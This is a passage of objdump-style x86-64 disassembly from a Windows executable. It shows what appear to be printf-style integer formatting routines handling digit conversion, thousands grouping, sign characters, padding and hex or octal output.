   1400040a3:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   1400040a7:	48 f7 d8             	neg    %rax
   1400040aa:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   1400040ae:	e9 d1 00 00 00       	jmp    0x140004184
   1400040b3:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400040b7:	8b 40 08             	mov    0x8(%rax),%eax
   1400040ba:	24 7f                	and    $0x7f,%al
   1400040bc:	89 c2                	mov    %eax,%edx
   1400040be:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400040c2:	89 50 08             	mov    %edx,0x8(%rax)
   1400040c5:	e9 ba 00 00 00       	jmp    0x140004184
   1400040ca:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400040ce:	48 3b 45 e8          	cmp    -0x18(%rbp),%rax
   1400040d2:	74 54                	je     0x140004128
   1400040d4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400040d8:	8b 40 08             	mov    0x8(%rax),%eax
   1400040db:	25 00 10 00 00       	and    $0x1000,%eax
   1400040e0:	85 c0                	test   %eax,%eax
   1400040e2:	74 44                	je     0x140004128
   1400040e4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400040e8:	0f b7 40 20          	movzwl 0x20(%rax),%eax
   1400040ec:	66 85 c0             	test   %ax,%ax
   1400040ef:	74 37                	je     0x140004128
   1400040f1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400040f5:	48 2b 45 e8          	sub    -0x18(%rbp),%rax
   1400040f9:	48 89 c2             	mov    %rax,%rdx
   1400040fc:	48 89 d0             	mov    %rdx,%rax
   1400040ff:	48 c1 f8 3f          	sar    $0x3f,%rax
   140004103:	48 c1 e8 3e          	shr    $0x3e,%rax
   140004107:	48 01 c2             	add    %rax,%rdx
   14000410a:	83 e2 03             	and    $0x3,%edx
   14000410d:	48 29 c2             	sub    %rax,%rdx
   140004110:	48 89 d0             	mov    %rdx,%rax
   140004113:	48 83 f8 03          	cmp    $0x3,%rax
   140004117:	75 0f                	jne    0x140004128
   140004119:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000411d:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004121:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   140004125:	c6 00 2c             	movb   $0x2c,(%rax)
   140004128:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   14000412c:	48 ba cd cc cc cc cc 	movabs $0xcccccccccccccccd,%rdx
   140004133:	cc cc cc 
   140004136:	48 89 c8             	mov    %rcx,%rax
   140004139:	48 f7 e2             	mul    %rdx
   14000413c:	48 c1 ea 03          	shr    $0x3,%rdx
   140004140:	48 89 d0             	mov    %rdx,%rax
   140004143:	48 c1 e0 02          	shl    $0x2,%rax
   140004147:	48 01 d0             	add    %rdx,%rax
   14000414a:	48 01 c0             	add    %rax,%rax
   14000414d:	48 29 c1             	sub    %rax,%rcx
   140004150:	48 89 ca             	mov    %rcx,%rdx
   140004153:	89 d0                	mov    %edx,%eax
   140004155:	8d 48 30             	lea    0x30(%rax),%ecx
   140004158:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000415c:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004160:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   140004164:	89 ca                	mov    %ecx,%edx
   140004166:	88 10                	mov    %dl,(%rax)
   140004168:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   14000416c:	48 ba cd cc cc cc cc 	movabs $0xcccccccccccccccd,%rdx
   140004173:	cc cc cc 
   140004176:	48 f7 e2             	mul    %rdx
   140004179:	48 89 d0             	mov    %rdx,%rax
   14000417c:	48 c1 e8 03          	shr    $0x3,%rax
   140004180:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140004184:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140004188:	48 85 c0             	test   %rax,%rax
   14000418b:	0f 85 39 ff ff ff    	jne    0x1400040ca
   140004191:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004195:	8b 40 10             	mov    0x10(%rax),%eax
   140004198:	85 c0                	test   %eax,%eax
   14000419a:	7e 3e                	jle    0x1400041da
   14000419c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400041a0:	8b 40 10             	mov    0x10(%rax),%eax
   1400041a3:	89 c1                	mov    %eax,%ecx
   1400041a5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400041a9:	48 2b 45 e8          	sub    -0x18(%rbp),%rax
   1400041ad:	89 c2                	mov    %eax,%edx
   1400041af:	89 c8                	mov    %ecx,%eax
   1400041b1:	29 d0                	sub    %edx,%eax
   1400041b3:	89 45 f4             	mov    %eax,-0xc(%rbp)
   1400041b6:	83 7d f4 00          	cmpl   $0x0,-0xc(%rbp)
   1400041ba:	7e 1e                	jle    0x1400041da
   1400041bc:	eb 0f                	jmp    0x1400041cd
   1400041be:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400041c2:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400041c6:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   1400041ca:	c6 00 30             	movb   $0x30,(%rax)
   1400041cd:	8b 45 f4             	mov    -0xc(%rbp),%eax
   1400041d0:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400041d3:	89 55 f4             	mov    %edx,-0xc(%rbp)
   1400041d6:	85 c0                	test   %eax,%eax
   1400041d8:	7f e4                	jg     0x1400041be
   1400041da:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400041de:	48 3b 45 e8          	cmp    -0x18(%rbp),%rax
   1400041e2:	75 1a                	jne    0x1400041fe
   1400041e4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400041e8:	8b 40 10             	mov    0x10(%rax),%eax
   1400041eb:	85 c0                	test   %eax,%eax
   1400041ed:	74 0f                	je     0x1400041fe
   1400041ef:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400041f3:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400041f7:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   1400041fb:	c6 00 30             	movb   $0x30,(%rax)
   1400041fe:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004202:	8b 40 0c             	mov    0xc(%rax),%eax
   140004205:	85 c0                	test   %eax,%eax
   140004207:	0f 8e ce 00 00 00    	jle    0x1400042db
   14000420d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004211:	8b 40 0c             	mov    0xc(%rax),%eax
   140004214:	89 c1                	mov    %eax,%ecx
   140004216:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000421a:	48 2b 45 e8          	sub    -0x18(%rbp),%rax
   14000421e:	89 c2                	mov    %eax,%edx
   140004220:	89 c8                	mov    %ecx,%eax
   140004222:	29 d0                	sub    %edx,%eax
   140004224:	89 c2                	mov    %eax,%edx
   140004226:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000422a:	89 50 0c             	mov    %edx,0xc(%rax)
   14000422d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004231:	8b 40 0c             	mov    0xc(%rax),%eax
   140004234:	85 c0                	test   %eax,%eax
   140004236:	0f 8e 9f 00 00 00    	jle    0x1400042db
   14000423c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004240:	8b 40 08             	mov    0x8(%rax),%eax
   140004243:	25 c0 01 00 00       	and    $0x1c0,%eax
   140004248:	85 c0                	test   %eax,%eax
   14000424a:	74 11                	je     0x14000425d
   14000424c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004250:	8b 40 0c             	mov    0xc(%rax),%eax
   140004253:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004256:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000425a:	89 50 0c             	mov    %edx,0xc(%rax)
   14000425d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004261:	8b 40 10             	mov    0x10(%rax),%eax
   140004264:	85 c0                	test   %eax,%eax
   140004266:	79 3b                	jns    0x1400042a3
   140004268:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000426c:	8b 40 08             	mov    0x8(%rax),%eax
   14000426f:	25 00 06 00 00       	and    $0x600,%eax
   140004274:	3d 00 02 00 00       	cmp    $0x200,%eax
   140004279:	75 28                	jne    0x1400042a3
   14000427b:	eb 0f                	jmp    0x14000428c
   14000427d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140004281:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004285:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   140004289:	c6 00 30             	movb   $0x30,(%rax)
   14000428c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004290:	8b 40 0c             	mov    0xc(%rax),%eax
   140004293:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140004296:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   14000429a:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   14000429d:	85 c0                	test   %eax,%eax
   14000429f:	7f dc                	jg     0x14000427d
   1400042a1:	eb 38                	jmp    0x1400042db
   1400042a3:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400042a7:	8b 40 08             	mov    0x8(%rax),%eax
   1400042aa:	25 00 04 00 00       	and    $0x400,%eax
   1400042af:	85 c0                	test   %eax,%eax
   1400042b1:	75 28                	jne    0x1400042db
   1400042b3:	eb 11                	jmp    0x1400042c6
   1400042b5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400042b9:	48 89 c2             	mov    %rax,%rdx
   1400042bc:	b9 20 00 00 00       	mov    $0x20,%ecx
   1400042c1:	e8 ca f8 ff ff       	call   0x140003b90
   1400042c6:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400042ca:	8b 40 0c             	mov    0xc(%rax),%eax
   1400042cd:	8d 48 ff             	lea    -0x1(%rax),%ecx
   1400042d0:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   1400042d4:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   1400042d7:	85 c0                	test   %eax,%eax
   1400042d9:	7f da                	jg     0x1400042b5
   1400042db:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400042df:	8b 40 08             	mov    0x8(%rax),%eax
   1400042e2:	25 80 00 00 00       	and    $0x80,%eax
   1400042e7:	85 c0                	test   %eax,%eax
   1400042e9:	74 11                	je     0x1400042fc
   1400042eb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400042ef:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400042f3:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   1400042f7:	c6 00 2d             	movb   $0x2d,(%rax)
   1400042fa:	eb 5a                	jmp    0x140004356
   1400042fc:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004300:	8b 40 08             	mov    0x8(%rax),%eax
   140004303:	25 00 01 00 00       	and    $0x100,%eax
   140004308:	85 c0                	test   %eax,%eax
   14000430a:	74 11                	je     0x14000431d
   14000430c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140004310:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004314:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   140004318:	c6 00 2b             	movb   $0x2b,(%rax)
   14000431b:	eb 39                	jmp    0x140004356
   14000431d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004321:	8b 40 08             	mov    0x8(%rax),%eax
   140004324:	83 e0 40             	and    $0x40,%eax
   140004327:	85 c0                	test   %eax,%eax
   140004329:	74 2b                	je     0x140004356
   14000432b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000432f:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004333:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
   140004337:	c6 00 20             	movb   $0x20,(%rax)
   14000433a:	eb 1a                	jmp    0x140004356
   14000433c:	48 83 6d f8 01       	subq   $0x1,-0x8(%rbp)
   140004341:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140004345:	0f b6 00             	movzbl (%rax),%eax
   140004348:	0f be c0             	movsbl %al,%eax
   14000434b:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   14000434f:	89 c1                	mov    %eax,%ecx
   140004351:	e8 3a f8 ff ff       	call   0x140003b90
   140004356:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000435a:	48 39 45 e8          	cmp    %rax,-0x18(%rbp)
   14000435e:	72 dc                	jb     0x14000433c
   140004360:	eb 11                	jmp    0x140004373
   140004362:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004366:	48 89 c2             	mov    %rax,%rdx
   140004369:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000436e:	e8 1d f8 ff ff       	call   0x140003b90
   140004373:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004377:	8b 40 0c             	mov    0xc(%rax),%eax
   14000437a:	8d 48 ff             	lea    -0x1(%rax),%ecx
   14000437d:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140004381:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   140004384:	85 c0                	test   %eax,%eax
   140004386:	7f da                	jg     0x140004362
   140004388:	90                   	nop
   140004389:	90                   	nop
   14000438a:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   14000438e:	5b                   	pop    %rbx
   14000438f:	5d                   	pop    %rbp
   140004390:	c3                   	ret
   140004391:	55                   	push   %rbp
   140004392:	53                   	push   %rbx
   140004393:	48 83 ec 68          	sub    $0x68,%rsp
   140004397:	48 8d 6c 24 60       	lea    0x60(%rsp),%rbp
   14000439c:	89 4d 20             	mov    %ecx,0x20(%rbp)
   14000439f:	48 89 d3             	mov    %rdx,%rbx
   1400043a2:	48 8b 03             	mov    (%rbx),%rax
   1400043a5:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   1400043a9:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   1400043ad:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
   1400043b1:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   1400043b5:	83 7d 20 6f          	cmpl   $0x6f,0x20(%rbp)
   1400043b9:	75 09                	jne    0x1400043c4
   1400043bb:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%rbp)
   1400043c2:	eb 07                	jmp    0x1400043cb
   1400043c4:	c7 45 f8 04 00 00 00 	movl   $0x4,-0x8(%rbp)
   1400043cb:	48 8b 55 30          	mov    0x30(%rbp),%rdx
   1400043cf:	8b 45 f8             	mov    -0x8(%rbp),%eax
   1400043d2:	49 89 d0             	mov    %rdx,%r8
   1400043d5:	89 c2                	mov    %eax,%edx
   1400043d7:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400043dc:	e8 9d fb ff ff       	call   0x140003f7e
   1400043e1:	89 45 e8             	mov    %eax,-0x18(%rbp)
   1400043e4:	48 c7 45 e0 00 00 00 	movq   $0x0,-0x20(%rbp)
   1400043eb:	00 
   1400043ec:	8b 45 e8             	mov    -0x18(%rbp),%eax
   1400043ef:	48 98                	cltq
   1400043f1:	48 83 c0 0f          	add    $0xf,%rax
   1400043f5:	48 c1 e8 04          	shr    $0x4,%rax
   1400043f9:	48 c1 e0 04          	shl    $0x4,%rax
   1400043fd:	e8 3e f6 ff ff       	call   0x140003a40
   140004402:	48 29 c4             	sub    %rax,%rsp
   140004405:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   14000440a:	48 83 c0 0f          	add    $0xf,%rax
   14000440e:	48 c1 e8 04          	shr    $0x4,%rax
   140004412:	48 c1 e0 04          	shl    $0x4,%rax
   140004416:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   14000441a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000441e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004422:	83 7d 20 6f          	cmpl   $0x6f,0x20(%rbp)
   140004426:	75 09                	jne    0x140004431
   140004428:	c7 45 ec 07 00 00 00 	movl   $0x7,-0x14(%rbp)
   14000442f:	eb 67                	jmp    0x140004498
   140004431:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%rbp)
   140004438:	eb 5e                	jmp    0x140004498
   14000443a:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   14000443e:	89 c2                	mov    %eax,%edx
   140004440:	8b 45 ec             	mov    -0x14(%rbp),%eax
   140004443:	21 d0                	and    %edx,%eax
   140004445:	8d 48 30             	lea    0x30(%rax),%ecx
   140004448:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000444c:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004450:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004454:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140004458:	89 ca                	mov    %ecx,%edx
   14000445a:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000445e:	88 10                	mov    %dl,(%rax)
   140004460:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004464:	0f b6 00             	movzbl (%rax),%eax
   140004467:	3c 39                	cmp    $0x39,%al
   140004469:	7e 1a                	jle    0x140004485
   14000446b:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000446f:	0f b6 00             	movzbl (%rax),%eax
   140004472:	83 c0 07             	add    $0x7,%eax
   140004475:	89 c2                	mov    %eax,%edx
   140004477:	8b 45 20             	mov    0x20(%rbp),%eax
   14000447a:	83 e0 20             	and    $0x20,%eax
   14000447d:	09 c2                	or     %eax,%edx
   14000447f:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004483:	88 10                	mov    %dl,(%rax)
   140004485:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
   140004489:	8b 45 f8             	mov    -0x8(%rbp),%eax
   14000448c:	89 c1                	mov    %eax,%ecx
   14000448e:	48 d3 ea             	shr    %cl,%rdx
   140004491:	48 89 d0             	mov    %rdx,%rax
   140004494:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140004498:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   14000449c:	48 85 c0             	test   %rax,%rax
   14000449f:	75 99                	jne    0x14000443a
   1400044a1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400044a5:	48 3b 45 e0          	cmp    -0x20(%rbp),%rax
   1400044a9:	75 13                	jne    0x1400044be
   1400044ab:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400044af:	8b 40 08             	mov    0x8(%rax),%eax
   1400044b2:	80 e4 f7             	and    $0xf7,%ah
   1400044b5:	89 c2                	mov    %eax,%edx
   1400044b7:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400044bb:	89 50 08             	mov    %edx,0x8(%rax)
   1400044be:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400044c2:	8b 40 10             	mov    0x10(%rax),%eax
   1400044c5:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400044c8:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400044cc:	7e 3a                	jle    0x140004508
   1400044ce:	8b 55 fc             	mov    -0x4(%rbp),%edx
   1400044d1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400044d5:	48 2b 45 e0          	sub    -0x20(%rbp),%rax
   1400044d9:	89 c1                	mov    %eax,%ecx
   1400044db:	89 d0                	mov    %edx,%eax
   1400044dd:	29 c8                	sub    %ecx,%eax
   1400044df:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400044e2:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400044e6:	7e 20                	jle    0x140004508
   1400044e8:	eb 0f                	jmp    0x1400044f9
   1400044ea:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400044ee:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400044f2:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   1400044f6:	c6 00 30             	movb   $0x30,(%rax)
   1400044f9:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400044fc:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400044ff:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140004502:	85 c0                	test   %eax,%eax
   140004504:	7f e4                	jg     0x1400044ea
   140004506:	eb 25                	jmp    0x14000452d
   140004508:	83 7d 20 6f          	cmpl   $0x6f,0x20(%rbp)
   14000450c:	75 1f                	jne    0x14000452d
   14000450e:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140004512:	8b 40 08             	mov    0x8(%rax),%eax
   140004515:	25 00 08 00 00       	and    $0x800,%eax
   14000451a:	85 c0                	test   %eax,%eax
   14000451c:	74 0f                	je     0x14000452d
   14000451e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004522:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004526:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   14000452a:	c6 00 30             	movb   $0x30,(%rax)
   14000452d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004531:	48 3b 45 e0          	cmp    -0x20(%rbp),%rax
   140004535:	75 1a                	jne    0x140004551
   140004537:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000453b:	8b 40 10             	mov    0x10(%rax),%eax
   14000453e:	85 c0                	test   %eax,%eax
   140004540:	74 0f                	je     0x140004551
   140004542:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004546:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000454a:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   14000454e:	c6 00 30             	movb   $0x30,(%rax)
   140004551:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140004555:	8b 40 0c             	mov    0xc(%rax),%eax
   140004558:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   14000455c:	48 2b 55 e0          	sub    -0x20(%rbp),%rdx
   140004560:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140004563:	39 45 fc             	cmp    %eax,-0x4(%rbp)
   140004566:	7d 15                	jge    0x14000457d
   140004568:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000456c:	8b 40 0c             	mov    0xc(%rax),%eax
   14000456f:	2b 45 fc             	sub    -0x4(%rbp),%eax
   140004572:	89 c2                	mov    %eax,%edx
   140004574:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140004578:	89 50 0c             	mov    %edx,0xc(%rax)
   14000457b:	eb 0b                	jmp    0x140004588
   14000457d:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140004581:	c7 40 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rax)
   140004588:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000458c:	8b 40 0c             	mov    0xc(%rax),%eax
   14000458f:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140004592:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140004596:	7e 1a                	jle    0x1400045b2
   140004598:	83 7d 20 6f          	cmpl   $0x6f,0x20(%rbp)
   14000459c:	74 14                	je     0x1400045b2
   14000459e:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400045a2:	8b 40 08             	mov    0x8(%rax),%eax
   1400045a5:	25 00 08 00 00       	and    $0x800,%eax
   1400045aa:	85 c0                	test   %eax,%eax
   1400045ac:	74 04                	je     0x1400045b2
   1400045ae:	83 6d fc 02          	subl   $0x2,-0x4(%rbp)
   1400045b2:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400045b6:	7e 3c                	jle    0x1400045f4
   1400045b8:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400045bc:	8b 40 10             	mov    0x10(%rax),%eax
   1400045bf:	85 c0                	test   %eax,%eax
   1400045c1:	79 31                	jns    0x1400045f4
   1400045c3:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400045c7:	8b 40 08             	mov    0x8(%rax),%eax
   1400045ca:	25 00 06 00 00       	and    $0x600,%eax
   1400045cf:	3d 00 02 00 00       	cmp    $0x200,%eax
   1400045d4:	75 1e                	jne    0x1400045f4
   1400045d6:	eb 0f                	jmp    0x1400045e7
   1400045d8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400045dc:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400045e0:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   1400045e4:	c6 00 30             	movb   $0x30,(%rax)
   1400045e7:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400045ea:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400045ed:	89 55 fc             	mov    %edx,-0x4(%rbp)
   1400045f0:	85 c0                	test   %eax,%eax
   1400045f2:	7f e4                	jg     0x1400045d8
   1400045f4:	83 7d 20 6f          	cmpl   $0x6f,0x20(%rbp)
   1400045f8:	74 30                	je     0x14000462a
   1400045fa:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400045fe:	8b 40 08             	mov    0x8(%rax),%eax
   140004601:	25 00 08 00 00       	and    $0x800,%eax
   140004606:	85 c0                	test   %eax,%eax
   140004608:	74 20                	je     0x14000462a
   14000460a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000460e:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004612:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004616:	8b 55 20             	mov    0x20(%rbp),%edx
   140004619:	88 10                	mov    %dl,(%rax)
   14000461b:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000461f:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004623:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004627:	c6 00 30             	movb   $0x30,(%rax)
   14000462a:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   14000462e:	7e 4c                	jle    0x14000467c
   140004630:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140004634:	8b 40 08             	mov    0x8(%rax),%eax
   140004637:	25 00 04 00 00       	and    $0x400,%eax
   14000463c:	85 c0                	test   %eax,%eax
   14000463e:	75 3c                	jne    0x14000467c
   140004640:	eb 11                	jmp    0x140004653
   140004642:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140004646:	48 89 c2             	mov    %rax,%rdx
   140004649:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000464e:	e8 3d f5 ff ff       	call   0x140003b90
   140004653:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140004656:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004659:	89 55 fc             	mov    %edx,-0x4(%rbp)
   14000465c:	85 c0                	test   %eax,%eax
   14000465e:	7f e2                	jg     0x140004642
   140004660:	eb 1a                	jmp    0x14000467c
   140004662:	48 83 6d f0 01       	subq   $0x1,-0x10(%rbp)
   140004667:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000466b:	0f b6 00             	movzbl (%rax),%eax
   14000466e:	0f be c0             	movsbl %al,%eax
   140004671:	48 8b 55 30          	mov    0x30(%rbp),%rdx
   140004675:	89 c1                	mov    %eax,%ecx
   140004677:	e8 14 f5 ff ff       	call   0x140003b90
   14000467c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004680:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
   140004684:	72 dc                	jb     0x140004662
   140004686:	eb 11                	jmp    0x140004699
   140004688:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000468c:	48 89 c2             	mov    %rax,%rdx
   14000468f:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004694:	e8 f7 f4 ff ff       	call   0x140003b90
   140004699:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000469c:	8d 50 ff             	lea    -0x1(%rax),%edx
   14000469f:	89 55 fc             	mov    %edx,-0x4(%rbp)
   1400046a2:	85 c0                	test   %eax,%eax
   1400046a4:	7f e2                	jg     0x140004688
   1400046a6:	90                   	nop
   1400046a7:	90                   	nop
   1400046a8:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   1400046ac:	5b                   	pop    %rbx
   1400046ad:	5d                   	pop    %rbp
   1400046ae:	c3                   	ret
   1400046af:	55                   	push   %rbp
   1400046b0:	53                   	push   %rbx
   1400046b1:	48 83 ec 28          	sub    $0x28,%rsp
   1400046b5:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400046ba:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   1400046be:	48 89 d3             	mov    %rdx,%rbx
   1400046c1:	db 2b                	fldt   (%rbx)
   1400046c3:	db 7d e0             	fstpt  -0x20(%rbp)
   1400046c6:	db 6d e0             	fldt   -0x20(%rbp)
   1400046c9:	db 7d f0             	fstpt  -0x10(%rbp)
   1400046cc:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   1400046d0:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400046d4:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   1400046d8:	48 89 01             	mov    %rax,(%rcx)
   1400046db:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   1400046df:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400046e3:	48 83 c4 28          	add    $0x28,%rsp
   1400046e7:	5b                   	pop    %rbx
   1400046e8:	5d                   	pop    %rbp
   1400046e9:	c3                   	ret
   1400046ea:	55                   	push   %rbp
   1400046eb:	53                   	push   %rbx
   1400046ec:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   1400046f3:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   1400046fa:	00 
   1400046fb:	89 4d 20             	mov    %ecx,0x20(%rbp)
   1400046fe:	48 89 d3             	mov    %rdx,%rbx
   140004701:	db 2b                	fldt   (%rbx)
   140004703:	db 7d d0             	fstpt  -0x30(%rbp)
   140004706:	44 89 45 30          	mov    %r8d,0x30(%rbp)
   14000470a:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   14000470e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
